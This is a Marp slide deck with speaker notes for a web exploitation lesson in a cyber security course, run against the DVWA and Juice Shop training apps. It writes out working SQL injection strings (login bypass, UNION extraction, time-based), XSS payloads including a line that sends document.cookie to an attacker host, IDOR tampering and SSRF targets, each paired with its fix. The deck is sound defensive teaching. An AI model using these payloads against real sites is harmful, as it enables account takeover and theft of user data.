---
marp: true
theme: dark-monospace
paginate: true
title: "Day 16 — Web Exploitation"
footer: "Practical Cyber Security (v2) · Week 4 · Day 16"
---

<!-- _class: lead -->

# Web exploitation
## Day 16 — Every web bug is "untrusted input reached something powerful"

**Week 4 · Applying it, and choosing a direction**

<!--
RUN SHEET (~85 min). Hands-on heavy. DVWA at "low" then "medium"; Juice Shop.
00:00 Journey check + hook (SQLi login bypass, live)           4
00:04 How a web app works + the tools (DevTools / Burp)        7
00:11 The OWASP Top 10 — the shape                             5
00:16 #1 Injection / SQLi — the mechanism                     11
00:27 DO: SQLi — login bypass + UNION extract                 12
00:39 #2 XSS — reflected / stored / DOM                       10
00:49 DO: stored XSS                                          10
00:59 #3 Broken access control / IDOR                          7
01:06 #4 & #5 — broken auth/session, SSRF                      5
01:11 Attack <-> defence — the one pattern                     4
01:15 Trap + wrap + homework                                   5
CUT FIRST IF SHORT: the SSRF half of #4-5; the Burp demo to 2 min; DOM XSS detail.
NEVER CUT: the injection mechanism + the SQLi DO, XSS + the stored-XSS DO, IDOR, the
"parameterize don't filter" trap, the find/prove/fix artifact.
ANALOGY (kitchen): untrusted input = an order ticket. If the kitchen blindly does whatever the
ticket says ("table 4: two pastas AND unlock the safe"), that's injection. A parameterized
query = an order form with fixed fields — the customer fills VALUES, never instructions.
ETHICS: DVWA / Juice Shop on <LAB_HOST> only (the ROE). These apps are built to be attacked.
-->

---

## Where we are

- **Week 3:** you ran the pentest lifecycle on services.
- **This week:** what attackers do *next*, how defenders catch them, AI, and your career path.
- **Today:** **web** — the most common attack surface — the OWASP Top 10, hands-on, with the fix for each.

<!--
Journey Check. Week 4 opens. Today is the most hands-on day of the course. Callback to Day 10:
"where does data from outside cross into somewhere powerful?" — today we walk through the door.
-->

---

## Hook — one quote mark

*(projector, DVWA or Juice Shop login)*

```
Username:  admin' --
Password:  (anything)
```

→ **Logged in as admin. No password.**

That `'` broke out of the app's SQL query. Today: why, and how to make it impossible.

<!--
Do it live. The `--` comments out the rest of the query (the password check). Let it land.
"The app trusted your input inside a command. That's the whole day."
-->

---

## How a web app works — and the tools

```
browser  --request-->  server code  -->  database / filesystem / other services
         <--response--              <--
```

Every **arrow** is a place your input can reach something powerful. (Day 10: the trust boundary.)

**Your tools:**
- **DevTools** (F12 → Network) — you know this (Day 4). See every request/response.
- **Burp Suite** — an intercepting proxy: catch a request, **change it**, forward it. The pro tool.
- **`curl`** — scripted requests, no browser.

<!--
Burp 2-min version: Proxy tab -> Intercept on -> browse -> the request pauses -> edit any
field -> Forward. Or "send to Repeater" to replay + tweak. That's 80% of web testing.
DVWA/Juice Shop are deliberately vulnerable training apps - attacking them is the point.
-->

---

## The OWASP Top 10 — the shape

A list, refreshed ~every 4 years, of the categories that **actually cause breaches**
(this is the 2021 set; a 2025 revision is in progress):

1. **Broken Access Control**   2. Cryptographic Failures   3. **Injection**
4. Insecure Design   5. Security Misconfiguration   6. Vulnerable Components
7. **Auth Failures**   8. Integrity Failures   9. Logging Failures   10. **SSRF**

We drill the **5 you'll meet most**: Injection (SQLi), XSS, Broken Access Control / IDOR,
Auth/Session, SSRF.

<!--
It's not a checklist to memorise - it's "these are where the money is". Broken Access Control
is #1 because it's everywhere and scanners miss it (it needs logic understanding).
XSS lives under "Injection" in the current list but we teach it separately - it behaves differently.
-->

---

## #1 Injection — SQLi: the mechanism

The app builds a query by **gluing your input into a string**:

```
"SELECT * FROM users WHERE name='" + input + "' AND pass='" + pw + "'"
```

You send `input = admin' --` →

```
SELECT * FROM users WHERE name='admin' -- ' AND pass='...'
```

The `'` ends the string; `--` comments out the rest. **Your data became code.**

<!--
Three flavours:
- Login bypass: `' OR '1'='1' -- `
- UNION extract: `' UNION SELECT username, password FROM users -- ` (pull data into the page)
- Blind: no output, but the page behaves differently for true vs false, or you time it
  (`' OR SLEEP(5) -- `)
-->

---

## SQLi — find / prove / fix

- **Find:** put a `'` in a field or URL param. Error? Different result? Login works oddly? →
  it's probably injectable.
- **Prove:** extract data you shouldn't see — `' UNION SELECT user,password FROM users -- `.
- **Fix:** **parameterized queries** (prepared statements). The query structure is fixed; input
  is bound as a **value**, never parsed as SQL:
  ```
  db.execute("SELECT * FROM users WHERE name=? AND pass=?", [name, pw])
  ```

<!--
The fix makes injection STRUCTURALLY IMPOSSIBLE - the DB driver keeps code and data separate.
This is the Day 16 trap, previewed: you do NOT fix injection by filtering out `'` and `--`.
ORMs parameterize by default. Stored procedures help but aren't automatic.
-->

---

## Do it now — SQLi

In DVWA (SQL Injection page, security = low) or Juice Shop login:

1. **Login bypass:** username `admin' --` (DVWA: `' or '1'='1`) → in without a password.
2. **Extract:** in the DVWA SQLi box, `1' UNION SELECT user, password FROM users -- -`
   → dump the users table (hashes — Day 5!).
3. Bump DVWA to **security = medium** and see what still works (and what doesn't).

Screenshot each. Note which payload worked at which security level.

<!--
12 min. Juice Shop login: email `' OR 1=1--`, any password -> admin. The password column is
MD5/bcrypt hashes -> callback to Day 5 (now go crack them with your Day 5 crack.py, optional).
"medium" adds some escaping - show that a determined payload still gets through, reinforcing
"filtering isn't the fix".
-->

---

## #2 XSS — your input runs in someone's browser

Your input is put into the page, and the browser **executes it as HTML/JS**:

| Type | Where | Who it hits |
|---|---|---|
| **Reflected** | in a URL parameter, echoed back | one victim you send the link to |
| **Stored** | saved (a comment, profile, review) | **everyone who views it** |
| **DOM** | client-side JS mishandles input | varies |

**Impact:** steal the **session cookie** (Day 4 — you *become* them), keylog, redirect, act as the user.

<!--
"XSS is just alert() popups" is the trap here. alert() is the PROOF; the real payload steals
`document.cookie` and sends it to the attacker, or does actions as the logged-in user.
Stored XSS in an admin panel = game over.
-->

---

## XSS — find / prove / fix

- **Find:** submit `<b>test</b>` or `<i>x</i>`. Does it render **bold/italic**? Then HTML
  isn't being encoded.
- **Prove:** `<script>alert(document.cookie)</script>` — or exfiltrate:
  `<script>new Image().src='//me/c?'+document.cookie</script>`
- **Fix (all three):**
  1. **context-aware output encoding** — `<` becomes `&lt;` *for the context it's rendered in*
  2. a **Content-Security-Policy** header — blocks inline scripts even if one slips in
  3. **HttpOnly** cookies — JavaScript can't read the session cookie

<!--
Encoding is context-dependent: HTML body vs an attribute vs inside a <script> vs a URL each
need different encoding. Frameworks (React, Angular) auto-encode in templates - which is why
"just use the framework's templating" is good advice.
-->

---

## Do it now — stored XSS

In DVWA (XSS Stored, security = low) or Juice Shop:

1. In a comment / feedback / name field, submit:
   `<script>alert(document.cookie)</script>`
2. **Reload the page** (or open it as "another user") — the script fires **without you doing
   anything**. That's *stored* — it hits every viewer.
3. Try `<img src=x onerror=alert(1)>` — works even when `<script>` is filtered.

<!--
10 min. The reload is the "aha" - the payload is now part of the page for everyone.
`<img onerror>` shows why blocklisting `<script>` doesn't work - there are dozens of ways to
run JS. Reinforces the trap again.
-->

---

## #3 Broken access control / IDOR

The app checks **authentication** ("are you logged in?") but not **authorization** ("are you
allowed *this* record?").

```
GET /account?id=1001      <- your account
GET /account?id=1002      <- ...someone else's, and it loads
```

Also: browsing straight to `/admin`, changing `role=user` to `role=admin` in a request.

- **Find:** change an ID, a path, a hidden field.
- **Prove:** see or change data that isn't yours.
- **Fix:** a **server-side authorization check on every request** — "does *this* user own *this*
  object?" Never trust the client to enforce it.

**Try it now (3 min):** in Juice Shop, log in, add an item to your basket, watch the
`/rest/basket/<id>` call in DevTools → change `<id>` → someone else's basket. Screenshot.

<!--
This is OWASP #1 and scanners can't find it - it needs understanding of what SHOULD be allowed.
"It requires a login, so it's fine" is the trap: logged-in != authorised for that specific thing.
DVWA has little IDOR - Juice Shop is the target for this one. Borrow the 3 min from #4-5 if needed.
-->

---

## #4 & #5 — quickly

**Broken authentication / session**
- weak passwords, no lockout, predictable/again-usable tokens, session not killed on logout,
  password reset flaws.
- **Fix:** MFA, lockout/rate-limit, cryptographically random tokens, `Secure`+`HttpOnly`+`SameSite`,
  invalidate on logout.

**SSRF — Server-Side Request Forgery**
- you give the app a URL ("import from this link"), it **fetches it server-side** → point it at
  `http://localhost/admin` or the cloud metadata service `169.254.169.254`.
- **Fix:** allowlist destinations, block internal IP ranges, don't take raw URLs from users.

<!--
5 min total. SSRF matters more in Week 4's cloud context (Day 17) - metadata endpoints hand
out credentials. CUT SSRF first if short.
-->

---

## Attack ↔ Defence — it's one pattern

**Every** vuln today: *untrusted input reached something powerful because it wasn't checked at
the boundary.*

| Vuln | The fix (structural) | A WAF... |
|---|---|---|
| SQLi | parameterized queries | catches common payloads — **not the fix** |
| XSS | output encoding + CSP | catches `<script>` — bypassable |
| IDOR | server-side authorization | can't see it at all |
| SSRF | destination allowlist | limited help |

**A WAF is defence in depth. The code is the fix.**

<!--
Show a WAF/app log line for a blocked SQLi attempt next to the one-line code fix. The WAF buys
time; it doesn't remove the bug. Devs who "rely on the WAF" ship the vuln.
-->

---

## The trap

> "We validate input — we strip out `'`, `<`, `script`, `--`."

**That does not fix injection or XSS.** Attackers bypass filters endlessly: encoding
(`%27`, `&#39;`), case (`ScRiPt`), alternate syntax (`<img onerror>`), Unicode, double-encoding.

**The fix is structural:** parameterized queries make SQLi *impossible*. Output encoding makes
XSS *impossible*. Filtering just makes it *harder for lazy attackers*.

<!--
Input validation is still good practice (reject a 5000-char "name") - just not as the security
control for injection. The structural fix + validation + a WAF = defence in depth.
-->

---

## Today's attack / defence / artifact

- **Attack:** find where input hits a query / the DOM / an auth check without a boundary check;
  prove it by extracting data or running code or reading another user's records.
- **Defence:** parameterize, encode (+ CSP), authorize server-side, allowlist — **at the boundary,
  in the code.** A WAF is a bonus layer, not the fix.
- **Artifact:** **"5 web vulns: find / prove / fix"** — one row per vuln, with **your own
  screenshots** of the proof (`day16/web-vulns.md`).

---

## Homework

1. Complete `day16/web-vulns.md` — the **find / prove / fix** table for **all 5** vuln classes,
   each with a screenshot of your proof from the lab. Commit it.
2. For **SQLi and XSS**, write the **one-line code fix** (parameterized query; output encoding)
   in the language of your choice.
3. `assets/vuln-code.md` — read the two vulnerable snippets; rewrite each the safe way.
4. Add `SQL injection`, `parameterized query`, `XSS (reflected/stored/DOM)`, `output encoding`,
   `CSP`, `IDOR`, `authorization vs authentication`, `SSRF`, `WAF` to your glossary.

<!--
Due start of Day 17.
-->

---

<!-- _class: lead -->

## Recap

1. **Every web bug is the same bug:** untrusted input reached something powerful without a check at the boundary.
2. **Fix it structurally:** parameterize queries, encode output (+ CSP), authorize server-side. Not by filtering.
3. **XSS steals sessions. IDOR ignores logins. A WAF is a layer, not a fix.**

<!--
Say the three lines. Tomorrow: what an attacker does AFTER getting in - post-exploitation,
privilege escalation, persistence, pivoting - and then the infrastructure and cloud side.
-->
